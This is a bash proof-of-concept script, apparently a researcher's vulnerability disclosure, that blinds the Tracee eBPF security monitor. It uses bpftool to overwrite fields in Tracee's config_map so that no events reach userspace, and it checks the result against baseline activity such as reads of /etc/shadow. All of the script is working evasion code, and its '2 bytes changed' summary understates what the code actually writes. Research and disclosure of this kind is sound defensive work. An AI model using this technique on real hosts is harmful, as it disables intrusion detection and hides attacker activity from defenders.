#!/bin/bash
# BPF Map Poisoning PoC: Total Tracee Blindness
# Researcher: Azizcan Daştan — Milenium Security
# Date: 2026-05-27
#
# Demonstrates complete evasion of Tracee (aquasec/tracee) by poisoning
# the config_map BPF map to zero out enabled_policies.
#
# Requirements:
#   - Linux kernel 5.8+ with BPF support
#   - CAP_BPF or CAP_SYS_ADMIN
#   - bpftool installed
#   - python3 with json module
#   - Docker (for running Tracee)
#
# Attack: Two-field write to config_map:
#   1. enabled_policies = 0  (offset 216 in config_entry_t for v0.24.x)
#   2. policies_version bump (offset 14, forces BPF programs to re-read poisoned config)
#
# Effect: match_scope_filters() returns 0 for ALL events.
#         Tracee becomes 100% blind. No events reach userspace.

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

TRACEE_CONTAINER="tracee-poc-test"
CONFIG_MAP_NAME="config_map"

log()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
fail() { echo -e "${RED}[-]${NC} $1"; }

cleanup() {
    log "Cleaning up..."
    docker rm -f "$TRACEE_CONTAINER" 2>/dev/null || true
}

find_config_map_id() {
    bpftool map list -j 2>/dev/null | python3 -c "
import json, sys
maps = json.load(sys.stdin)
for m in maps:
    if m.get('name') == '$CONFIG_MAP_NAME' and m['type'] == 'array':
        print(m['id'])
        sys.exit(0)
sys.exit(1)
"
}

read_config_map() {
    local map_id=$1
    bpftool map dump id "$map_id" -j 2>/dev/null | python3 -c "
import json, sys
data = json.load(sys.stdin)
val = data[0]['value']
val_ints = [int(v, 16) if isinstance(v, str) else v for v in val]
tracee_pid = int.from_bytes(bytes(val_ints[0:4]), 'little')
policies_version = int.from_bytes(bytes(val_ints[14:16]), 'little')
enabled_policies = int.from_bytes(bytes(val_ints[216:224]), 'little')
print(f'{tracee_pid}|{policies_version}|{enabled_policies}|{len(val_ints)}')
"
}

poison_config_map() {
    local map_id=$1
    bpftool map dump id "$map_id" -j 2>/dev/null | python3 -c "
import json, sys, subprocess

data = json.load(sys.stdin)
val = data[0]['value']
val_ints = [int(v, 16) if isinstance(v, str) else v for v in val]

current_version = int.from_bytes(bytes(val_ints[14:16]), 'little')

# Zero out enabled_policies (offset 216-223)
for i in range(216, 224):
    val_ints[i] = 0

# Bump policies_version to force BPF programs to re-read
new_version = current_version + 1
val_ints[14] = new_version & 0xFF
val_ints[15] = (new_version >> 8) & 0xFF

hex_val = ' '.join(f'{b:02x}' for b in val_ints)
cmd = f'bpftool map update id $map_id key hex 00 00 00 00 value hex {hex_val}'
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
sys.exit(result.returncode)
"
}

restore_config_map() {
    local map_id=$1
    local orig_version=$2
    bpftool map dump id "$map_id" -j 2>/dev/null | python3 -c "
import json, sys, subprocess

data = json.load(sys.stdin)
val = data[0]['value']
val_ints = [int(v, 16) if isinstance(v, str) else v for v in val]

# Restore enabled_policies = 1
val_ints[216] = 1
for i in range(217, 224):
    val_ints[i] = 0

# Restore original version
val_ints[14] = $orig_version & 0xFF
val_ints[15] = ($orig_version >> 8) & 0xFF

hex_val = ' '.join(f'{b:02x}' for b in val_ints)
cmd = f'bpftool map update id $map_id key hex 00 00 00 00 value hex {hex_val}'
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
sys.exit(result.returncode)
"
}

count_events() {
    docker logs "$TRACEE_CONTAINER" 2>&1 | wc -l
}

generate_activity() {
    /bin/ls /etc/shadow > /dev/null 2>&1 || true
    /bin/cat /etc/passwd > /dev/null 2>&1
    /usr/bin/whoami > /dev/null 2>&1
    /usr/bin/id > /dev/null 2>&1
    /bin/uname -a > /dev/null 2>&1
    /bin/ps aux > /dev/null 2>&1
    /usr/bin/find /tmp -maxdepth 1 > /dev/null 2>&1
    /bin/bash -c "echo invisible" > /dev/null 2>&1
}

echo ""
echo "============================================================"
echo "  BPF Map Poisoning PoC: Total Tracee Blindness"
echo "  Researcher: Azizcan Daştan — Milenium Security"
echo "============================================================"
echo ""

# Phase 0: Setup
log "Starting Tracee container..."
docker rm -f "$TRACEE_CONTAINER" 2>/dev/null || true
docker run -d --name "$TRACEE_CONTAINER" \
    --privileged \
    --pid=host \
    -v /etc/os-release:/etc/os-release-host:ro \
    -v /boot:/boot:ro \
    -v /lib/modules:/lib/modules:ro \
    -v /sys/kernel/debug:/sys/kernel/debug:rw \
    aquasec/tracee:latest 2>/dev/null

log "Waiting for Tracee to initialize (15s)..."
sleep 15

# Phase 1: Find config_map
log "Locating Tracee config_map..."
MAP_ID=$(find_config_map_id)
if [ -z "$MAP_ID" ]; then
    fail "Could not find config_map. Is Tracee running?"
    cleanup
    exit 1
fi
ok "Found config_map: ID=$MAP_ID"

IFS='|' read -r TRACEE_PID ORIG_VERSION ORIG_ENABLED MAP_SIZE <<< "$(read_config_map "$MAP_ID")"
ok "tracee_pid=$TRACEE_PID, policies_version=$ORIG_VERSION, enabled_policies=$ORIG_ENABLED, size=${MAP_SIZE}B"

if [ "$ORIG_ENABLED" -eq 0 ]; then
    warn "enabled_policies already 0 — unexpected state"
    cleanup
    exit 1
fi

# Phase 2: Baseline
log "Phase 2: Establishing baseline (generating activity)..."
BASELINE_BEFORE=$(count_events)
sleep 1
generate_activity
sleep 3
BASELINE_AFTER=$(count_events)
BASELINE_EVENTS=$((BASELINE_AFTER - BASELINE_BEFORE))

if [ "$BASELINE_EVENTS" -eq 0 ]; then
    fail "Tracee not detecting events in baseline. Aborting."
    cleanup
    exit 1
fi
ok "Baseline: $BASELINE_EVENTS events detected (Tracee is working)"

# Phase 3: POISON
echo ""
log "Phase 3: POISONING config_map..."
log "  Writing enabled_policies=0, bumping policies_version..."

if poison_config_map "$MAP_ID"; then
    ok "Map poisoned successfully!"
else
    fail "Map poisoning failed!"
    cleanup
    exit 1
fi

IFS='|' read -r _ NEW_VERSION NEW_ENABLED _ <<< "$(read_config_map "$MAP_ID")"
ok "Verified: policies_version=$NEW_VERSION, enabled_policies=$NEW_ENABLED"

# Phase 4: Test blindness
echo ""
log "Phase 4: Testing Tracee blindness..."
POISON_BEFORE=$(count_events)
sleep 1
generate_activity
sleep 4
POISON_AFTER=$(count_events)
POISON_EVENTS=$((POISON_AFTER - POISON_BEFORE))

echo ""
echo "============================================================"
if [ "$POISON_EVENTS" -eq 0 ]; then
    ok "TOTAL BLINDNESS CONFIRMED!"
    ok "Tracee detected ZERO events after BPF map poisoning."
    ok "Baseline had $BASELINE_EVENTS events, post-poison has 0."
    echo ""
    ok "Attack: 2 bytes changed in config_map (ID=$MAP_ID)"
    ok "  - enabled_policies: $ORIG_ENABLED -> 0"
    ok "  - policies_version: $ORIG_VERSION -> $NEW_VERSION"
elif [ "$POISON_EVENTS" -le 2 ]; then
    warn "Near-total blindness: $POISON_EVENTS events leaked (vs $BASELINE_EVENTS baseline)"
else
    fail "Partial effect: $POISON_EVENTS events (vs $BASELINE_EVENTS baseline)"
fi
echo "============================================================"

# Phase 5: Restore
echo ""
log "Phase 5: Restoring Tracee..."
if restore_config_map "$MAP_ID" "$ORIG_VERSION"; then
    ok "Config restored (enabled_policies=1, version=$ORIG_VERSION)"
else
    warn "Restore failed"
fi

sleep 2
RESTORE_BEFORE=$(count_events)
generate_activity
sleep 3
RESTORE_AFTER=$(count_events)
RESTORE_EVENTS=$((RESTORE_AFTER - RESTORE_BEFORE))

if [ "$RESTORE_EVENTS" -gt 0 ]; then
    ok "Tracee recovered: $RESTORE_EVENTS events after restore"
else
    warn "Tracee did not recover immediately (may need more time)"
fi

echo ""
echo "============================================================"
echo "  Summary"
echo "============================================================"
echo "  Baseline events:      $BASELINE_EVENTS"
echo "  Post-poison events:   $POISON_EVENTS"
echo "  Post-restore events:  $RESTORE_EVENTS"
echo "  Attack surface:       config_map (BPF array, ID=$MAP_ID)"
echo "  Fields modified:      enabled_policies, policies_version"
echo "  Required capability:  CAP_BPF"
echo "  Tool used:            bpftool map update"
echo "============================================================"
echo ""

cleanup
